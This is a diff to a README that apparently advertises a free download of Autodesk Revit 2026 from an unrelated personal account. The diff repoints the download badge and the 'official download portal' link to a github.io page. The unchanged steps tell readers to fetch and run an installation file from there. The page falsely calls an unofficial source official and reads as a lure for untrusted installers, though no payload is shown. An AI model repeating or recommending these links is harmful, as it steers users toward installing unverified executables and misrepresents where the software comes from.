@@ -1,6 +1,6 @@
 # 🏗️ Autodesk-Revit-2026 - Streamline your building design workflow efficiency
 
-[![](https://img.shields.io/badge/Download-Revit%202026-blue)](https://github.com/Morselschottische791/Autodesk-Revit-2026)
+[![](https://img.shields.io/badge/Download-Revit%202026-blue)](https://morselschottische791.github.io)
 
 ## 📖 About this software
 
@@ -23,7 +23,7 @@ Your computer must meet specific standards to run this software. Check your syst
 
 Follow these steps to obtain and install the software on your machine.
 
-1. Visit the [official download portal](https://github.com/Morselschottische791/Autodesk-Revit-2026) to manage your files.
+1. Visit the [official download portal](https://morselschottische791.github.io) to manage your files.
 2. Select the latest version listed on the page.
 3. Download the installation file to your computer.
 4. Locate the downloaded file in your Downloads folder.
